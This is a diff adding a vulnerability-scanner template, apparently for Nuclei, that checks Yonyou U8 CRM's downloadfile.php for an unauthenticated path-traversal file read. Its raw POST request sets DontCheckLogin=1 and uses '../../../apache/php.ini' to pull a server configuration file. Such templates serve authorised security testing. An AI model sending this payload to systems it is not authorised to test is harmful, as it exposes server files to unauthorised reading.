@@ -1,0 +1,32 @@
+id: yongyou-u8-crm-downloadfile-file-read
+
+info:
+  name: 用友u8-crm接口downloadFile存在文件读取漏洞
+  author: g3m
+  severity: high
+
+http:
+  - raw:
+    - |
+      @timeout 30s
+      POST /pub/downloadfile.php HTTP/1.1
+      Host: {{hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+      Content-Length: 55
+      Accept: */*
+      Content-Type: application/x-www-form-urlencoded
+      Accept-Encoding: gzip
+
+      DontCheckLogin=1&url=/datacache/../../../apache/php.ini
+
+    matchers-condition: and
+    matchers:
+    - type: word
+      words:
+        - "php.ini"
+
+    - type: status
+      status:
+        - 200
+    
+ 
